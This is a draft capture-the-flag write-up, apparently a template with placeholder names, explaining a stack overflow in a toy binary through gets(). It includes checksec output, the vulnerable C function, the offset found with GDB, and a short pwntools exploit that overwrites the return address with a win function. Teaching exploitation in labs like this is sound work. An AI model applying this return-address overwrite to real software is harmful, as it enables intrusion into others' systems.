---
title: "CTF Write-ups: [Write up test]"
draft: true
tags: 
 - "CTF"
showToc: true
TocOpen: false
---

## 1. Summary
[This challenge] is a beginner-friendly binary exploitation challenge test from [ctf name], The binary suffers from a standard stack overflow due to the unsafe use of the `gets()`.

## 2. Initial Analysis 
first, i ran `checksec` against the provided binary to inspect its protection

```bash
checksec --file=vuln
# Output:
# RELRO: Partial relro
# stack: no canary found
# NX:   Nx disabled
# PIE:  No PIE
```
*Takeaway:* With no stack canary and PIE disabled, the memory addresses stay static, making a standard return-address overwrite highly feasible.

## 3. Vulnerability Discovery (Static Analysis)
Opening the binary in Ghidra, I located the main logic written in C:

```c
void vulnerable_function() {
    char buffer[64];
    printf("Enter some text: ");
    gets(buffer); // <--- VULNERABILITY: No bounds checking
}
```
The `buffer` allocated on the stack is only 64 bytes. However, `gets()` will continuously read user input until a newline character is hit, allowing us to corrupt adjacent stack memory.

## 4. Exploitation (The Math)
To control the Instruction Pointer (`EIP`/`RIP`), we need to find the exact distance from the start of our buffer to the saved return address.

Using GDB-Peda/GEF, I generated a cyclic pattern:
```bash
gdb ./vuln
GEF> pattern create 100
```
After crashing the program with the pattern, GDB showed a crash at offset **76**.

### The Payload Script
Here is the automated exploit using Python's `pwntools` library:

```python
from pwn import *

# Target configuration
io = process('./vuln')
win_address = 0x080484cb  # Found via 'info functions' in GDB

# Construct payload: Offset padding + Target Address
payload = b"A" * 76 + p32(win_address)

# Send and interact
io.sendline(payload)
print(io.recvall().decode())
```

## 5. Conclusion
This challenge highlights why functions like `gets()` are banned in modern secure coding. Always use safer alternatives like `fgets()`, which enforce strict buffer length limits.
